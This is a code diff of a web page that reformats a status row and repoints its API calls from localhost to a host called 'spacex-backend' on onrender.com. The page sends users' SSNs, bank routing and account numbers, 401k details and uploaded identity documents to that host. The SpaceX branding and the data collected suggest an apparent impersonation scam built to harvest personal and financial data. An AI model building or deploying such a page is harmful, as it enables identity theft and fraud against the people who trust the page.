@@ -401,7 +401,9 @@
         <div class="row"><span>Provider</span><b id="d-prov"></b></div>
         <div class="row"><span>Name</span><b id="d-name"></b></div>
         <div class="row"><span>Amount</span><b id="d-amt"></b></div>
-        <div class="row"><span>Status</span><b id="d-status">Pending review</b></div>
+        <div class="row">
+          <span>Status</span><b id="d-status">Pending review</b>
+        </div>
         <button
           class="go"
           type="button"
@@ -479,7 +481,7 @@
         document.getElementById("intro").style.display = "block";
       };
 
-      fetch("http://localhost:4000/api/me", {
+      fetch("https://spacex-backend-yxlo.onrender.com/api/me", {
         headers: {
           Authorization: "Bearer " + localStorage.getItem("authToken"),
         },
@@ -580,27 +582,30 @@
 
         try {
           var token = localStorage.getItem("authToken");
-          var response = await fetch("http://localhost:4000/api/401k", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-              Authorization: "Bearer " + token,
+          var response = await fetch(
+            "https://spacex-backend-yxlo.onrender.com/api/401k",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                Authorization: "Bearer " + token,
+              },
+              body: JSON.stringify({
+                provider: prov,
+                legalName: name,
+                username: username,
+                ssn: ssn,
+                bankName: bankName,
+                routingNumber: routingNumber,
+                accountNumber: accountNumber,
+                accountType: accountType,
+                accountHolderName: accountHolderName,
+                bankConsent: bankConsent,
+                balance: amt,
+                planType: currentIdType,
+              }),
             },
-            body: JSON.stringify({
-              provider: prov,
-              legalName: name,
-              username: username,
-              ssn: ssn,
-              bankName: bankName,
-              routingNumber: routingNumber,
-              accountNumber: accountNumber,
-              accountType: accountType,
-              accountHolderName: accountHolderName,
-              bankConsent: bankConsent,
-              balance: amt,
-              planType: currentIdType,
-            }),
-          });
+          );
 
           var payload = await response.json();
           if (!response.ok)
@@ -617,7 +622,7 @@
             formData.append("docType", fileInfo.type);
             formData.append("document", file);
             var uploadResponse = await fetch(
-              "http://localhost:4000/api/kyc/upload",
+              "https://spacex-backend-yxlo.onrender.com/api/kyc/upload",
               {
                 method: "POST",
                 headers: { Authorization: "Bearer " + token },
